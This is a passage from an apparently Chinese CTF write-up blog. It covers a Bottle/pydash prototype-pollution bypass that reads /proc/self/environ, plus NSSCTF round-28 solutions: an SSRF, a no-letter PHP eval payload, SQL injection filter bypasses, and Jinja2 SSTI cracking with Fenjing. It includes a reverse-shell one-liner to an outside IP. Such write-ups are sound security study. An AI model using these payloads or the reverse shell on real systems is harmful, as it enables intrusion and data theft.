class="token punctuation">.</span>filename <span class="token operator">=</span> self<span class="token punctuation">.</span>search<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> self<span class="token punctuation">.</span>lookup<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>filename<span class="token punctuation">:</span>                <span class="token keyword">raise</span> TemplateError<span class="token punctuation">(</span><span class="token string">'Template %s not found.'</span> <span class="token operator">%</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>source <span class="token keyword">and</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>filename<span class="token punctuation">:</span>            <span class="token keyword">raise</span> TemplateError<span class="token punctuation">(</span><span class="token string">'No template specified.'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span><span class="token operator">**</span>self<span class="token punctuation">.</span>settings<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@classmethod</span><span class="token comment">#目标是（name=environ）</span>    <span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> name<span class="token punctuation">,</span> lookup<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#在 lookup 指定的所有目录中搜索 name，先直接搜索，再尝试添加常见扩展名搜索，返回第一个找到的文件。</span>        <span class="token triple-quoted-string string">""" Search name in all directories specified in lookup.        First without, then with common extensions. Return first hit. """</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> lookup<span class="token punctuation">:</span>            <span class="token keyword">raise</span> depr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">"Empty template lookup path."</span><span class="token punctuation">,</span> <span class="token string">"Configure a template lookup path."</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isabs<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> depr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token string">"Use of absolute path for template name."</span><span class="token punctuation">,</span>                       <span class="token string">"Refer to templates with names or paths relative to the lookup path."</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> spath <span class="token keyword">in</span> lookup<span class="token punctuation">:</span>            spath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>spath<span class="token punctuation">)</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>sep<span class="token comment">#遍历 lookup 列表中的每个查找路径 spath。使用 os.path.abspath 将 spath 转换为绝对路径，并在末尾添加路径分隔符 os.sep。</span>            fname <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>spath<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> fname<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>spath<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">continue</span>            <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>fname<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> fname<span class="token comment">#检查 fname 是否为一个存在的文件。如果是，直接返回该文件的路径。</span>            <span class="token keyword">for</span> ext <span class="token keyword">in</span> cls<span class="token punctuation">.</span>extensions<span class="token punctuation">:</span><span class="token comment">#如果直接搜索 fname 没有找到文件，遍历类属性 cls.extensions 中的每个扩展名 ext。尝试在 fname 后面添加扩展名 ext，并检查添加扩展名后的文件是否存在。如果存在，返回该文件的路径。</span>                <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">'%s.%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>fname<span class="token punctuation">,</span> ext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token string">'%s.%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>fname<span class="token punctuation">,</span> ext<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@classmethod</span>    <span class="token keyword">def</span> <span class="token function">global_config</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">""" This reads or sets the global settings stored in class.settings. """</span>        <span class="token keyword">if</span> args<span class="token punctuation">:</span>            cls<span class="token punctuation">.</span>settings <span class="token operator">=</span> cls<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># Make settings local to class</span>            cls<span class="token punctuation">.</span>settings<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> cls<span class="token punctuation">.</span>settings<span class="token punctuation">[</span>key<span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">prepare</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">""" Run preparations (parsing, caching, ...).        It should be possible to call this again to refresh a template or to        update settings.        """</span>        <span class="token keyword">raise</span> NotImplementedError    <span class="token keyword">def</span> <span class="token function">render</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">""" Render the template with the specified local variables and return        a single byte or unicode string. If it is a byte string, the encoding        must match self.encoding. This method must be thread-safe!        Local variables may be provided in dictionaries (args)        or directly, as keywords (kwargs).        """</span>        <span class="token keyword">raise</span> NotImplementedError<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">template(*args, **kwargs){adapter}---&gt;BaseTemplate{search(cls, name, lookup=None)}[SimpleTemplate需要BaseTemplate]---&gt;SimpleTemplate(BaseTemplate){self.prepare(**self.settings)}---&gt;def template(*args, **kwargs){return TEMPLATES[tplid].render(kwargs)}---&gt;SimpleTemplate(BaseTemplate){def render(self, *args, **kwargs)}---&gt; SimpleTemplate(BaseTemplate){self.execute(stdout, env)[exec(self.co, env)]}---&gt; 构建了env执行环境，然后在env中执行预编译的模板也就是这里的self.c----&gt;&gt; if env.get('_rebase')[def _rebase( _env['_rebase'] = (_name, kwargs)(找到了))]--&gt; SimpleTemplate(BaseTemplate){def _include[ return self.cache[_name].execute(env['_stdout'], env)]}(递归，污染？)---&gt;SimpleTemplate(BaseTemplate){ def render(self, *args, **kwargs)[r return ''.join(stdout)]}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>template:adapter()-&gt;class:BaseTemplate:search() &gt;class:SimpleTemplate:prepare()-&gt;render()-&gt;exec()-&gt;stdout</p></blockquote><p>回看</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">adapter <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'template_adapter'</span><span class="token punctuation">,</span> SimpleTemplate<span class="token punctuation">)</span>   lookup <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'template_lookup'</span><span class="token punctuation">,</span> TEMPLATE_PATH<span class="token punctuation">)</span>    <span class="token comment">#here</span>     tplid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>lookup<span class="token punctuation">)</span><span class="token punctuation">,</span> tpl<span class="token punctuation">)</span>     TEMPLATES<span class="token punctuation">[</span>tplid<span class="token punctuation">]</span> <span class="token operator">=</span> adapter<span class="token punctuation">(</span>name<span class="token operator">=</span>tpl<span class="token punctuation">,</span> lookup<span class="token operator">=</span>lookup<span class="token punctuation">,</span> <span class="token operator">**</span>settings<span class="token punctuation">)</span>    <span class="token keyword">return</span> TEMPLATES<span class="token punctuation">[</span>tplid<span class="token punctuation">]</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>adapter是很重要的,将lookup后的SimpleTemplate，最后会读取的ta的environ模板文件，最后返回TEMPLATES[tplid].render(kwargs)。而lookup的是TEMPLATE_PATH，我们目标是找环境，改这个就行（用set)。</p><blockquote><p>我们需要读取其environ，就可以利 用/proc/self/environ  来读取</p></blockquote><p>其默认的值为 ./ 和 ./views/，我们再加一个/proc/self/就行了，即”./“,”./views/“,”/proc/self/“</p><p>有黑名单，so改一下：</p><p><code>setval.__globals__.bottle.</code>！！！！！！这简直是神来之笔，直接绕过黑名单bottle了，牛啊！！！</p><pre class="line-numbers language-none"><code class="language-none">setval.__globals__.bottle.TEMPLATE_PATH= ['proc/self/']<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>setValue?name<span class="token operator">=</span>setval HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token punctuation">{</span> <span class="token string">"path"</span><span class="token punctuation">:</span> <span class="token string">"__globals__.bottle.TEMPLATE_PATH"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">:</span>   <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"./"</span><span class="token punctuation">,</span><span class="token string">"./views/"</span><span class="token punctuation">,</span> <span class="token string">"/proc/self/"</span>  <span class="token punctuation">]</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>但pydash的版本是8.0.5，因此不能够直接通过<code>__globals__</code>去获得bottle，在pydash 5.1.2版本中能够使用<code>__globals__</code>，但是高版本下已经被修复了，现在会报access to restricted key <code>__globals__</code>，因此我们要想办法绕过restricted key。</p><p><code>RESTRICTED_KEYS</code> 元组的作用是标识出那些在特定上下文中不应该被使用的关键标识符。</p></blockquote><p>just去康康源码找找 restricted key</p><p><a href="https://github.com/dgilland/pydash/blob/develop/src/pydash/helpers.py">pydash/src/pydash/helpers.py at develop · dgilland/pydash</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#: Object keys that are restricted from access via path access.</span>RESTRICTED_KEYS <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"__globals__"</span><span class="token punctuation">,</span> <span class="token string">"__builtins__"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>so可以通过pydash自己污染掉<code>RESTRICTED_KEYS</code>从而使用globals(这脑洞也太离谱了吧，真无敌了吧)，想出这个的真是天才。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>setValue?name<span class="token operator">=</span>pydash HTTP<span class="token operator">/</span><span class="token number">1.1</span> <span class="token punctuation">{</span> <span class="token string">"path"</span><span class="token punctuation">:</span> <span class="token string">"helpers.RESTRICTED_KEYS"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在就可以了，先改pydash,再改bottle</p><p>随后直接render?path=environ即可 </p><p><del>搞完这个真要晕晕了吧。。。</del></p><hr><p><a href="https://blog.csdn.net/allway2/article/details/126703565">https://blog.csdn.net/allway2/article/details/126703565</a></p><p>像HTTP Status Code 进行 XSLeaks和java反序列化更是从没遇到过哈哈,so再等等吧，待我进化进化再搞他们！</p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nss#round28</title>
      <link href="/2025/03/30/untitled/"/>
      <url>/2025/03/30/untitled/</url>
      
        <content type="html"><![CDATA[<h3 id="ez-ssrf"><a href="#ez-ssrf" class="headerlink" title="ez_ssrf"></a>ez_ssrf</h3><p>签到</p><pre class="line-numbers language-none"><code class="language-none">?url=http://127.0.0.2/flag?url=http://0/flagNSSCTF{79d62330-1f3f-4704-8147-017ffd491e76}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c2f1197b270d16832afb6972ccbcc5de.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt; ?phperror_reporting(0);if (isset($_POST['rce'])) {    $rce = $_POST['rce'];    if (strlen($rce) &lt;= 120) {        if (is_string($rce)) {            if (!preg_match("/[!@#%^&amp;*:'\-<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token operator">&gt;</span>\<span class="token string double-quoted-string">"\/|`a-zA-Z~\\\\]/"</span><span class="token punctuation">,</span> <span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Are you hack me?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"I want string!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"too long!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.cnblogs.com/pursue-security/p/15404150.html">RCE篇之无数字字母rce - 学安全的小白 - 博客园</a></p><p><a href="https://www.php.net/manual/zh/language.operators.increment.php">PHP: 递增/递减 - Manual</a></p><p>试了试只能用自增，但一看就会超字数啊喂</p><p>后来了解到这是原题（啊？）</p><p>[NSSCTF-HNCTF-<a href="https://hyh32.github.io/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/">Week1]Challenge__rce | Jokak_blog</a></p><p>[NSS <a href="https://blog.csdn.net/Jayjay___/article/details/132927786">HNCTF 2022 Week1]Challenge__rce_nss rce-CSDN博客</a></p><pre class="line-numbers language-none"><code class="language-none">$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);rce=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>整个下来118差点超。。。<del>有点刻晴了</del></p><p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250322165007930.png" alt="image-20250322165007930"></p><p>非预期：</p><p>用<code>find / -name '*' -exec grep -H 'NSS' {} \; 2&gt;/dev/null</code>找or</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c3ef7945ab890cefee42682594fff5cd.png"></p><p><code>NSSCTF{2764a09f-9e05-429a-ae31-4a02072eba9e}</code></p><p><del>不是，这也太离谱了吧（</del></p><p>我说怎么有几分钟就搞出来的。。。</p><hr><h3 id="light-pink"><a href="#light-pink" class="headerlink" title="light_pink"></a>light_pink</h3><p>=,-,and,char,file,&lt;,&gt;,sleep,right被过滤</p><p><a href="https://blog.csdn.net/devil8123665/article/details/108746947#7.%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%EF%BC%88%23%EF%BC%8C--%EF%BC%89%E8%BF%87%E6%BB%A4%EF%BC%9A">SQL注入一些过滤及绕过总结_sql注入过滤-CSDN博客</a></p><blockquote><p>.绕过注释符号（#，–）过滤：</p><p>id=1’union select 1,2,3||’1</p><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><p>id=1’union select 1,2,’3</p></blockquote><p>-被ban?id=-1’union select 1,2,3,database(),2’就用不了，但目标是前面报错即可，随便换个就行。然后其他步骤与buuctf第二页的“[网鼎杯 2018]Fakebook”一样，就不赘述了。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span>$<span class="token number">1</span><span class="token string">'union select 1,2,3,database(),2'</span><span class="token comment">#nss_board</span>?id<span class="token operator">=</span>$<span class="token number">1</span><span class="token string">'union select 1,2,database(),group_concat(table_name),4 from mysql.innodb_table_stats where database_name like"nss_board"'</span><span class="token comment">#Cute,messages</span>?id<span class="token operator">=</span>$<span class="token number">1</span><span class="token string">'union select 1,2,3,(select group_concat(x.b) from (select (select 1)a,(select 2)b union select * from Cute)x),2'</span><span class="token comment">#得flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/27ac24bf63ab60fadf0c101d7932e0a5.png"></p><p>这个题好像还可以用蚁剑，shell.php+cmd，但没试哈哈哈，在db.sql里。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4b9392041259527ce23ec7bee1274ff6.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4c1bee7c0f2186f106d8f6e6e12cd814.png"></p><pre class="line-numbers language-none"><code class="language-none">grep -rl -- "NSSCTF{" /目标路径参数解析：-r：递归搜索子目录。-l：仅输出文件名。--：明确分隔选项与参数，避免路径以 - 开头时被误解析为选项。/目标路径：要搜索的目录路径。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5aced465d06e2dbdc1d1ac6651ae418b.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2091b976838d333c6e6464db64cfcdda.png"></p><hr><h3 id="Coding-Loving"><a href="#Coding-Loving" class="headerlink" title="Coding Loving"></a>Coding Loving</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span>    command <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">,</span> <span class="token string">'coding'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/test'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'test'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'Auth.html'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>abc<span class="token operator">:=</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'Auth.html'</span><span class="token punctuation">)</span>    cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">,</span> <span class="token string">'试一试'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        css_url <span class="token operator">=</span> url_for<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">,</span> filename<span class="token operator">=</span><span class="token string">'style.css'</span><span class="token punctuation">)</span>        command <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> contains_forbidden_keywords<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'forbidden.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从<code>/</code>拿到cookie用在<code>/test</code>再POST传即可</p><pre class="line-numbers language-none"><code class="language-none">Cookie: session=eyJ1c2VyIjoidGVzdCJ9.Z-kFTQ.IlO9pYlII8cn3J2o2fYWaAs3G3w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要用fenjing,但我不了解。。。</p><p><a href="https://github.com/Marven11/FenJing">Marven11/Fenjing: 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 | A Jinja2 SSTI cracker for bypassing WAF, designed for CTF</a></p><p><a href="https://github.com/Marven11/Fenjing/blob/main/examples.md">Fenjing/examples.md at main · Marven11/Fenjing</a></p><blockquote><p>可以用crack功能，手动指定参数进行攻击：</p><pre class="line-numbers language-none"><code class="language-none">python -m fenjing crack --url 'http://xxxx:xxx/yyy' --detect-mode fast --inputs aaa,bbb --method GET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里提供了aaa和bbb两个参数进行攻击，并使用<code>--detect-mode fast</code>加速攻击速度</p></blockquote><pre class="line-numbers language-none"><code class="language-none">source ~/.bashrcfenjing webui#很帅的火红色界面~但好像这次不用哈哈,webui不支持自定义Headers和Cookie等特性fenjing crack --url 'http://node6.anna.nssctf.cn:24989/test' --cookie session=eyJ1c2VyIjoidGVzdCJ9.Z-kFTQ.IlO9pYlII8cn3J2o2fYWaAs3G3w --inputs cmd --method POST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/55ce66cde96ecbecc5330c69d2e1056d.png"></p><p>哈哈哈</p><pre class="line-numbers language-none"><code class="language-none">fenjing crack --url 'http://node6.anna.nssctf.cn:24989/test' --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-kFTQ.IlO9pYlII8cn3J2o2fYWaAs3G3w --inputs cmd --method POST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:/Users/16256/AppData/Roaming/Typora/typora-user-images/image-20250330170119023.png" alt="image-20250330170119023"></p><p>或者直接弹shell<code>bash -c "bash -i &gt;&amp; /dev/tcp/8.140.217.166/7777 0&gt;&amp;1"</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/84e6c4a74c6145c0cbfbf121c12edca7.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b988f9d09e52f3e886778c893689aa31.png"></p><p>还有一种方法</p><blockquote><h3 id="crack-keywords"><a href="#crack-keywords" class="headerlink" title="crack-keywords"></a>crack-keywords</h3><p>如果已经拿到了服务端源码<code>app.py</code>的话，可以自动提取代码中的列表作为黑名单生成对应的payload</p><p>命令如下：</p><pre class="line-numbers language-none"><code class="language-none">python -m fenjing crack-keywords -k app.py -c 'ls /'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>把waf测试出来了，然后fenjing本地调用跑payload(</p><p>找来了waf的ww</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"网址:"</span><span class="token punctuation">)</span>pattern <span class="token operator">=</span> <span class="token string">r'[0123456789abacefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&amp;*()_+\-=\[\]{};\'\\:"|,.&lt;&gt;/?~`]'</span>session_cookie <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'session'</span><span class="token punctuation">:</span> <span class="token string">'eyJ1c2VyIjoidGVzdCJ9.Z95U2w.b87Ov4hGLSMAhPgQPHqcFRtmiVU'</span><span class="token punctuation">}</span>blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>whitelist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> char <span class="token keyword">in</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> pattern<span class="token punctuation">)</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        url<span class="token punctuation">,</span>        data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"cmd"</span><span class="token punctuation">:</span> char<span class="token punctuation">}</span><span class="token punctuation">,</span>        cookies<span class="token operator">=</span>session_cookie    <span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Testing character: </span><span class="token interpolation"><span class="token punctuation">{</span>char<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'检测到输入非法字符'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        blacklist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Character '</span><span class="token interpolation"><span class="token punctuation">{</span>char<span class="token punctuation">}</span></span><span class="token string">' is blacklisted."</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        whitelist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Character '</span><span class="token interpolation"><span class="token punctuation">{</span>char<span class="token punctuation">}</span></span><span class="token string">' is whitelisted."</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token 